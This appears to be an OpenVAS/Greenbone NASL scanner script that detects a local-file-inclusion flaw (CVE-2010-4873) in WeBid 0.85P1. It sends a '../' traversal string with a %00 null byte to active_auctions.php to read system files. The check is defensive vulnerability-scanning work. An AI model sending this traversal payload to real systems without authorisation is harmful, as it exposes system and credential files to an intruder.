# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:webidsupport:webid";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100903");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-11-11 13:24:47 +0100 (Thu, 11 Nov 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-4873");

  script_name("WeBid Multiple Input Validation Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44765");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/WeBid.0.8.5P1.Reflected.Cross-site.Scripting/62");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/WeBid.0.8.5P1.Local.File.Inclusion/63");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_webid_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webid/installed");

  script_tag(name:"summary", value:"WeBid is prone to multiple input-validation vulnerabilities because it
  fails to adequately sanitize user-supplied input. These vulnerabilities include a local file-include
  vulnerability and a cross-site-scripting vulnerability.");

  script_tag(name:"impact", value:"Exploiting these issues can allow an attacker to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site, obtain potentially
  sensitive information, and execute arbitrary local scripts in the context of the webserver process. This
  may allow the attacker to compromise the application and the computer. Other attacks are also possible.");

  script_tag(name:"affected", value:"WeBid 0.85P1 is vulnerable. Other versions may be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/active_auctions.php?lan=",crap(data:"../",length:3*9),files[file],"%00");
  if(http_vuln_check(port:port, url:url,pattern:file)) {
    security_message(port:port);
    exit(0);
  }
}

exit(0);
